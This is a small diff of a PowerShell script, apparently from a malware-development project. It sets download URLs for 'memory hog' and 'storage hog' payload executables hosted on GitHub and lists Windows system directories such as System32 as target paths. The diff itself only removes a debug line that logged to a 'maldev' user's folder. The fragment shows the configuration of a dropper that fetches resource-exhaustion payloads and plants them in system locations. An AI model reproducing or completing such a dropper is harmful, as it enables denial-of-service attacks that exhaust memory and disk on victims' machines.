@@ -5,7 +5,7 @@ $memHogUri = "https://github.com/Soumyo001/progressive_overload/raw/refs/heads/m
 $storageHogUri = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/storage_hog.exe"
 $memPropertyName = "mem"
 $storagePropertyName = "store"
-echo $basePath >> "C:\Users\maldev\Downloads\root.txt"
+
 $paths = @(
     "$env:windir\system32\config\systemprofile\AppData\Local",
     "$env:windir\System32",
